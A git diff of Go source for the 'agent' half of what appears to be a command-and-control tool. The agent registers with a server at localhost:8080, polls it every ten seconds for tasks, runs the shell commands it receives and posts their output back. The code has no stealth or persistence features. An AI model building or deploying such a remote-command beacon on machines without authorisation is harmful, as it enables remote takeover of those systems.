@@ -1,3 +1,4 @@
+// The agent which executes commands and sends results back to the server
 package agent
 
 import (
@@ -5,24 +6,40 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/MeHungr/peanut-butter/internal/api"
 )
 
-type ClientAgent struct {
+// Agent has an api.Agent embedded, and creates additional methods
+// and fields for use in the agent package
+type Agent struct {
 	api.Agent
-	ServerIP         string        `json:"server_ip"`
-	ServerPort       int           `json:"server_port"`
-	CallbackInterval time.Duration `json:"callback_interval,omitempty"`
+	*http.Client
+}
+
+func getLocalIP() string {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return "?.?.?.?"
+	}
+	for _, addr := range addrs {
+		// Filters out loopback addresses
+		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
+			return ipnet.IP.String()
+		}
+	}
+	return "?.?.?.?"
 }
 
 // Register allows the agent to register with the server
-func (agent *ClientAgent) Register() error {
+func (agent *Agent) Register() error {
 	url := fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort)
 
-	// Marshals the agent id into JSON
+	// Marshals the agent's id into JSON
 	body, err := json.Marshal(map[string]string{
 		"agent_id": agent.ID,
 	})
@@ -30,8 +47,8 @@ func (agent *ClientAgent) Register() error {
 		return fmt.Errorf("Failed to marshal JSON: %w", err)
 	}
 
-	// POST request with the agent id as the body
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
+	// POST request with the agent's id as the body
+	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
 	if err != nil {
 		return fmt.Errorf("Failed to send POST request: %w", err)
 	}
@@ -53,11 +70,127 @@ func (agent *ClientAgent) Register() error {
 
 }
 
-func Start() {
-	agent := ClientAgent{
-		Agent: api.Agent{ID: "1"},
-		ServerIP:   "localhost",
-		ServerPort: 8080,
+// GetTask retrieves a task from the server to be executed
+func (agent *Agent) GetTask() (*api.Task, error) {
+	url := fmt.Sprintf("http://%s:%d/task", agent.ServerIP, agent.ServerPort)
+
+	// Marshals the agent's id into JSON
+	body, err := json.Marshal(map[string]string{
+		"agent_id": agent.ID,
+	})
+	if err != nil {
+		return nil, fmt.Errorf("Failed to marshal JSON: %w", err)
 	}
-	agent.Register()
+
+	// POST request with the agent's id as the body
+	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
+	if err != nil {
+		return nil, fmt.Errorf("Failed to send POST request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusNoContent {
+		return nil, nil // No task available
+	} else if resp.StatusCode != http.StatusOK {
+		respBody, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
+	} else {
+		// Decodes the JSON body into a Task
+		var agentTask api.Task
+		if err := json.NewDecoder(resp.Body).Decode(&agentTask); err != nil {
+			return nil, fmt.Errorf("Failed to decode task JSON: %w", err)
+		}
+		return &agentTask, nil
+	}
+}
+
+// ExecuteTask executes the task retrieved by GetTask
+func (agent *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
+	if strings.TrimSpace(task.Payload) == "" {
+		return &api.Result{Output: "No task payload"}, nil
+	}
+
+	// Declares the result and its agent id
+	result := &api.Result{}
+	result.AgentID = agent.ID
+	result.TaskID = task.ID
+
+	switch task.Type {
+	case "command":
+		result.Output, result.ReturnCode = executeCommand(task)
+	default:
+		return result, fmt.Errorf("Undefined task type in JSON: %s", task.Type)
+	}
+
+	return result, nil
+}
+
+func (agent *Agent) SendResult(result *api.Result) error {
+	// Ensures result is not a nil pointer
+	if result == nil {
+		return fmt.Errorf("result is nil")
+	}
+
+	url := fmt.Sprintf("http://%s:%d/result", agent.ServerIP, agent.ServerPort)
+
+	// Marshals the result into JSON
+	body, err := json.Marshal(result)
+	if err != nil {
+		return fmt.Errorf("Failed to marshal JSON: %w", err)
+	}
+
+	// Sends a POST request containing the result
+	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
+	if err != nil {
+		return fmt.Errorf("Failed to send POST request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	// Checks the status code and reports errors, does nothing on OK
+	if resp.StatusCode != http.StatusOK {
+		respBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
+	}
+
+	return nil
+}
+
+func Start() {
+	agent := Agent{
+		Agent: api.Agent{
+			ID:         getLocalIP(),
+			ServerIP:   "localhost",
+			ServerPort: 8080,
+			CallbackInterval: 10 * time.Second,
+		},
+		Client: &http.Client{Timeout: 10 * time.Second},
+	}
+
+	// Attempt to register with the server until successful
+	for {
+		err := agent.Register()
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		break
+	}
+
+	// Main polling loop
+	for {
+		task, err := agent.GetTask()
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		if task != nil {
+			result, err := agent.ExecuteTask(task)
+			if err != nil {
+				fmt.Println(err)
+			}
+			agent.SendResult(result)
+		}
+
+		time.Sleep(agent.CallbackInterval)
+	}
 }
